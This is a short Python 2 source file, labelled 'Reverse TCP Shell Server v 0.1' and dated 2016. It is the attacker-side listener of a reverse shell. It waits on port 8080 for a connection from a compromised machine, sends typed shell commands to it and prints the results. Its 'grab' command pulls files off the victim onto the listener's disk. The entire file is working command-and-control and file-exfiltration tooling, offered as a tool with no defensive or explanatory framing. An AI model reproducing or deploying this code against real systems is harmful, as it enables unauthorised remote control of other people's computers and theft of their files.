#!/usr/bin/env python
# -*- coding: utf-8 -*-

#################################
# Reverse TCP Shell Server v 0.1
# Furkan Çalışkan, 2016
#################################

import socket

def transfer(conn, command):
	conn.send(command)
	f = open('/root/Desktop/test.png','wb')
	while True:
		bits = conn.recv(1024)
		if 'Unable to find out the file' in bits:
			print '[-] Unable to find out the file'
			break
		if bits.endswith('DONE'):
			print '[+] Transfer completed '
			f.close()
			break
		f.write(bits)
	f.close()

def connect():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(("192.168.35.134", 8080))
	s.listen(1)
	conn, addr = s.accept()
	print '[+] We got a connection from: ', addr
	
	while True:
		command = raw_input("Shell> ")	
		
		if 'terminate' in command:
			conn.send('terminate')
			conn.close()
			break
		elif 'grab' in command:
			transfer(conn, command)
		
		else:
			conn.send(command)
			print conn.recv(1024)

def main():
	connect()
main()
